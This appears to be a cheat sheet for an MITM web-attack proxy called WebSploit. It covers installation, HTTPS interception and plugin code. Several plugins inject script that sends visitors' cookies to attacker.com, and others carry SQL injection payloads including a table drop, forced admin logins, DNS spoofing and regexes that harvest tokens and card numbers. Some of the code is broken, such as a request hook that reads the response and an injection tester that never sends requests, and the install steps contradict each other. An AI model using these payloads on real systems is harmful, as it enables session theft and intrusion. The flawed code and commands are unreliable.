# WebSploit advanced

## Overview

WebSploit is a sophisticated man-in-the-middle (MITM) framework designed for testing, analyzing, and exploiting web applications. It functions as a transparent HTTP/HTTPS proxy with extensive plugin capabilities, allowing security researchers to intercept traffic, inject payloads, modify requests and responses, and analyze application behavior. WebSploit is used for authorized penetration testing, security research, and vulnerability assessment.

## Installation

### Ubuntu/Debian

```bash
# Install dependencies
sudo apt-get install python3-pip python3-dev
sudo apt-get install libssl-dev libffi-dev

# Clone repository
git clone https://github.com/WebSploit/websploit.git
cd websploit

# Install WebSploit
sudo pip3 install -r requirements.txt
sudo python3 setup.py install
```

### Kali Linux

```bash
# WebSploit is often pre-installed
websploit --version

# If not present, install via git
sudo apt install websploit

# Or from source
git clone https://github.com/WebSploit/websploit.git
cd websploit && sudo python3 setup.py install
```

### macOS

```bash
# Install via Homebrew
brew install websploit

# Or from source
git clone https://github.com/WebSploit/websploit.git
cd websploit
pip3 install -r requirements.txt
python3 setup.py install
```

### Requirements

```bash
pip3 install mitmproxy flask dnspython
pip3 install requests pycryptodome
pip3 install netaddr
```

## Core Concepts

### MITM Framework Architecture

```plaintext
Client -> WebSploit Proxy -> Web Server
           (intercept/modify)

Request flow:
1. Client sends HTTP/HTTPS request
2. WebSploit receives and can modify
3. Request forwarded to server
4. Response intercepted and modified
5. Response returned to client
```

### Traffic Interception

```plaintext
WebSploit supports:
- HTTP traffic (plaintext)
- HTTPS traffic (with CA certificate)
- DNS requests
- WebSocket connections
- SSL/TLS inspection
```

## Basic Usage

### Start WebSploit

```bash
# Start default proxy on localhost:8080
websploit

# Start on custom port
websploit --port 9999

# Start in console mode
websploit --console

# Verbose logging
websploit -v
```

### Configure Browser

#### Firefox

```plaintext
1. Settings -> Network Settings
2. Manual proxy configuration
3. HTTP Proxy: localhost, Port: 8080
4. HTTPS Proxy: localhost, Port: 8080
5. Check "Also use this proxy for HTTPS"
```

#### Proxy Configuration via CLI

```bash
# Set environment variables
export http_proxy="http://localhost:8080"
export https_proxy="http://localhost:8080"

# Test with curl
curl -v https://example.com --insecure
```

## Traffic Interception

### Intercept HTTP Requests

```bash
# Start WebSploit with interception enabled
websploit --intercept-requests

# Browse to target website
# WebSploit will pause each request for modification
```

### Intercept Responses

```bash
# Intercept responses from server
websploit --intercept-responses

# Modify HTML/JavaScript before sending to client
```

### Selective Interception

```bash
# Create filter configuration
cat > filter.yaml <<EOF
intercept:
  requests:
    - path: "*/api/*"
    - path: "*login*"
  responses:
    - content-type: "application/json"
EOF

websploit --filter filter.yaml
```

## Request/Response Modification

### Modify Headers

```python
# WebSploit plugin: modify_headers.py
def request_hook(flow):
    # Add header
    flow.request.headers["X-Custom"] = "injected"

    # Remove header
    del flow.request.headers["Authorization"]

    # Modify header
    flow.request.headers["User-Agent"] = "CustomAgent/1.0"

def response_hook(flow):
    # Modify response headers
    flow.response.headers["X-Powered-By"] = "Custom"
```

### Modify Request Body

```python
def request_hook(flow):
    # Modify POST data
    if flow.request.method == "POST":
        # Parse JSON body
        import json
        body = json.loads(flow.request.text)
        body['admin'] = True
        body['role'] = 'administrator'
        flow.request.text = json.dumps(body)
```

### Modify Response Body

```python
def response_hook(flow):
    if "text/html" in flow.response.headers.get("Content-Type", ""):
        # Inject JavaScript
        injection = """
        <script>
        fetch('http://attacker.com/steal?data=' + document.cookie);
        </script>
        """
        flow.response.text = flow.response.text.replace(
            "</body>",
            injection + "</body>"
        )
```

## Common Commands

| Command | Description |
| --- | --- |
| `websploit` | Start default proxy |
| `websploit --port 9999` | Custom port |
| `websploit --console` | Interactive console |
| `websploit --intercept-requests` | Pause requests |
| `websploit --intercept-responses` | Pause responses |
| `websploit -v` | Verbose output |
| `websploit --ca` | Generate CA certificate |
| `websploit --dump` | Dump traffic to file |

## SSL/TLS Configuration

### Generate CA Certificate

```bash
# WebSploit generates CA on first run
# Certificate location: ~/.websploit/ca.crt

# Trust CA certificate on Linux
sudo cp ~/.websploit/ca.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates

# Trust CA on macOS
sudo security add-trusted-cert -d -r trustRoot \
  -k /Library/Keychains/System.keychain ~/.websploit/ca.crt

# Trust CA on Windows
certutil -addstore -f ROOT ~/.websploit/ca.crt
```

### HTTPS Interception

```bash
# WebSploit automatically intercepts HTTPS
# with properly installed CA certificate

# Verify certificate trust
websploit --test-ssl https://example.com
```

## Plugin Development

### Basic Plugin Structure

```python
# plugins/custom_plugin.py

class CustomPlugin:
    def __init__(self):
        self.name = "Custom Plugin"
        self.description = "Custom WebSploit plugin"

    def request_hook(self, flow):
        """Process request"""
        pass

    def response_hook(self, flow):
        """Process response"""
        pass
```

### XSS Injection Plugin

```python
# plugins/xss_injector.py

class XSSInjector:
    def response_hook(self, flow):
        """Inject XSS payload into responses"""

        if "text/html" in flow.response.headers.get("Content-Type", ""):
            payload = """
            <script>
            var img = new Image();
            img.src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
            </script>
            """

            flow.response.text = flow.response.text.replace(
                "</body>",
                payload + "</body>"
            )
```

### SQL Injection Testing Plugin

```python
# plugins/sqli_tester.py

class SQLiTester:
    def request_hook(self, flow):
        """Test for SQL injection vulnerabilities"""

        if flow.request.method == "GET":
            test_payloads = [
                "' OR '1'='1",
                "1; DROP TABLE users--",
                "admin' --",
            ]

            for param, value in flow.request.args.items():
                for payload in test_payloads:
                    # Create test request
                    test_request = flow.request.copy()
                    test_request.args[param] = payload
                    # Send and analyze response
```

### Authentication Bypass Plugin

```python
# plugins/auth_bypass.py

class AuthBypass:
    def request_hook(self, flow):
        """Attempt to bypass authentication"""

        if "/login" in flow.request.url or "/auth" in flow.request.url:
            # Modify credentials
            import json
            body = json.loads(flow.request.text)
            body['username'] = 'admin'
            body['password'] = 'admin'
            body['remember_me'] = True
            flow.request.text = json.dumps(body)
```

## Advanced Usage

### DNS Spoofing

```bash
# Spoof DNS responses
websploit --dns-spoof example.com:attacker.com

# Multiple DNS spoofs
websploit --dns-spoof \
  example.com:attacker.com \
  api.example.com:attacker-api.com
```

### Request/Response Dumping

```bash
# Dump all traffic to file
websploit --dump traffic.log

# Format: text
websploit --dump traffic.log --format text

# Format: JSON
websploit --dump traffic.log --format json
```

### Replay Requests

```python
# Capture and replay requests
def replay_request(flow):
    """Save request for replay"""
    import pickle
    with open('captured_request.pkl', 'wb') as f:
        pickle.dump(flow.request, f)

# Later, replay the request
import pickle
with open('captured_request.pkl', 'rb') as f:
    request = pickle.load(f)
    # Modify and replay
    request.url = "https://different-server.com" + request.path
```

## WebSocket Interception

### Intercept WebSocket Traffic

```python
# plugins/websocket_monitor.py

class WebSocketMonitor:
    def websocket_message(self, flow):
        """Monitor WebSocket messages"""

        message = flow.message
        print(f"[*] WebSocket message from {flow.client_conn.address}:")
        print(f"    Opcode: {message.opcode}")
        print(f"    Payload: {message.content}")

        # Modify payload
        if isinstance(message.content, str):
            message.content = message.content.replace(
                "sensitive_data",
                "REDACTED"
            )
```

## Traffic Analysis

### Parse and Analyze Traffic

```python
def analyze_traffic(flow):
    """Analyze request/response patterns"""

    # Analyze request
    request = flow.request
    print(f"Method: {request.method}")
    print(f"URL: {request.url}")
    print(f"Headers: {dict(request.headers)}")
    print(f"Body size: {len(request.text)}")

    # Analyze response
    response = flow.response
    print(f"Status: {response.status_code}")
    print(f"Content-Type: {response.headers.get('Content-Type')}")
    print(f"Response size: {len(response.text)}")

    # Look for vulnerabilities
    if "admin" in response.text and "true" in response.text:
        print("[!] Possible privilege escalation found")
```

### Extract Sensitive Data

```python
import re

def extract_sensitive_data(flow):
    """Extract sensitive information from traffic"""

    response = flow.response.text

    patterns = {
        'api_keys': r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{20,})',
        'tokens': r'["\']?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{20,})',
        'emails': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        'credit_cards': r'[0-9]{4}[-\s]?[0-9]{4}[-\s]?[0-9]{4}[-\s]?[0-9]{4}',
    }

    for data_type, pattern in patterns.items():
        matches = re.findall(pattern, response, re.IGNORECASE)
        if matches:
            print(f"[!] Found {data_type}: {matches}")
```

## Performance Optimization

### Request Filtering

```python
def request_hook(flow):
    """Skip processing for certain requests"""

    # Skip static files
    if flow.request.url.endswith(('.css', '.js', '.png', '.jpg', '.gif')):
        flow.ignore = True
        return

    # Skip health checks
    if '/health' in flow.request.url or '/ping' in flow.request.url:
        flow.ignore = True
        return
```

### Caching Responses

```python
import hashlib
import json

response_cache = {}

def response_hook(flow):
    """Cache responses to improve performance"""

    url_hash = hashlib.md5(flow.request.url.encode()).hexdigest()

    if url_hash in response_cache:
        # Return cached response
        cached = response_cache[url_hash]
        flow.response = cached
    else:
        # Cache new response
        response_cache[url_hash] = flow.response
```

## Practical Exploitation Examples

### Session Hijacking

```python
def request_hook(flow):
    """Capture and modify session cookies"""

    if "Set-Cookie" in flow.response.headers:
        cookie_value = flow.response.headers["Set-Cookie"]

        # Capture
        print(f"[*] Session cookie: {cookie_value}")

        # Modify (if needed)
        # flow.response.headers["Set-Cookie"] = "session=attacker_id"
```

### CSRF Token Manipulation

```python
import re

def request_hook(flow):
    """Modify CSRF tokens"""

    if flow.request.method == "POST":
        # Extract CSRF token from body
        match = re.search(r'csrf_token=([a-f0-9]{32})', flow.request.text)
        if match:
            original_token = match.group(1)
            # Optionally modify
            # new_token = "a" * 32
            # flow.request.text = flow.request.text.replace(original_token, new_token)
```

## Security Considerations

### Intercepting Your Own Traffic Only

```bash
# Only intercept specific domains
websploit --filter-domains example.com,api.example.com

# Use localhost isolation
websploit --bind-address 127.0.0.1
```

### Credential Protection

```bash
# Do not intercept sensitive sites (banks, email)
# Keep certificates in secure location
chmod 600 ~/.websploit/ca.key

# Use separate test environment
# Never test on production without authorization
```

## Troubleshooting

### Certificate Trust Issues

```bash
# Verify certificate installation
openssl x509 -in ~/.websploit/ca.crt -text -noout

# Force certificate regeneration
rm ~/.websploit/ca.crt
websploit --regenerate-ca

# Test SSL connection
openssl s_client -connect localhost:8080 -CAfile ~/.websploit/ca.crt
```

### Proxy Connection Issues

```bash
# Check if port is available
netstat -tlnp | grep 8080

# Use different port
websploit --port 9999

# Check firewall
sudo ufw allow 8080
```

### Plugin Loading Errors

```bash
# Verify plugin syntax
python3 -m py_compile plugins/custom_plugin.py

# Check plugin location
ls -la plugins/

# Test plugin in isolation
python3 -c "from plugins.custom_plugin import *"
```

## Related Tools

| Tool | Purpose | Comparison |
| --- | --- | --- |
| Burp Suite | Full web testing | GUI, more features |
| mitmproxy | Traffic interception | Terminal-based alternative |
| OWASP ZAP | Security scanning | Automated vulnerability detection |
| Fiddler | HTTP debugging | Windows-focused |
| Charles Proxy | Traffic inspection | Commercial, macOS/Windows |

## References

- [WebSploit GitHub](https://github.com/WebSploit/websploit)

- [OWASP: Web Application Security](https://owasp.org/)

- [RFC 2616: HTTP/1.1](https://tools.ietf.org/html/rfc2616)

- [MITM Techniques Research](https://portswigger.net/research/browser-request-security)

## Legal Notice

WebSploit is for authorized security testing only. Man-in-the-middle attacks without explicit authorization are illegal. Only use on systems you own or have written permission to test. Unauthorized interception of network traffic violates computer fraud and wiretapping laws.

Source: https://1337skills.com/cheatsheets/websploit/
